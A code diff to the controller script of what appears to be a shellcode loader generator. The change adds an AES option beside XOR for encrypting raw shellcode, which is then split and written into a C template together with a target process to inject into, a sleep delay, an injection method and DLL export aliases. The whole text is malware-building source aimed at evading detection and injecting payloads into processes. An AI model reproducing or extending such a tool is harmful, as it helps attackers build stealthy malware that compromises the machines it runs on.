@@ -6,6 +6,7 @@ from Encryption.Xor import DoXor,key,key_hex
 from Templates.Split_Xor_Shellcode import split_xor_shellcode
 from Templates.C_Template import template
 from Templates.Arguments  import parse_arguments
+from Encryption.AES import encryptAES,keyAES
 
 def Controller():
 
@@ -19,18 +20,18 @@ def Controller():
     args = parse_arguments()
     try:
         plaintext = open(args.raw[0],"rb").read()
-        output_folder = args.path
+        output_folder = args.path[0]
         process_to_inject = args.pname
-        file_alias = args.dexports
+        file_alias = args.dexports[0]
         if file_alias not in array_dll_names:
             print(f"Invalid file option. Available options: {', '.join(array_dll_names.keys())}\n")
             sys.exit(1)
         file_option = array_dll_names[file_alias]
-        encryption_type =  args.enc
-        injection = args.inj
-        shellcode_var =args.rshell
-        xor_func = args.rxor
-        key_var = args.rkey
+        encryption_type =  args.enc[0]
+        injection = args.inj[0]
+        shellcode_var =args.rshell[0]
+        xor_func = args.rxor[0]
+        key_var = args.rkey[0]
         time = args.rsleep
     except:
         parse_arguments()
@@ -44,10 +45,12 @@ def Controller():
     if encryption_type == "XOR":
         ciphertext = DoXor(plaintext, key)
         ciphertext_split = split_xor_shellcode(ciphertext)
+        c_template=template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,key_hex,process_to_inject,time,injection,encryption_type)
 
-    
-
-    c_template=template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,key_hex,process_to_inject,time,injection)
+    elif encryption_type == "AES":
+        ciphertext = encryptAES(plaintext,keyAES)
+        ciphertext_split = split_xor_shellcode(ciphertext)
+        c_template=template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,keyAES,process_to_inject,time,injection,encryption_type)
 
     # Create the output folder if it doesn't exist
     if not os.path.exists(output_folder):
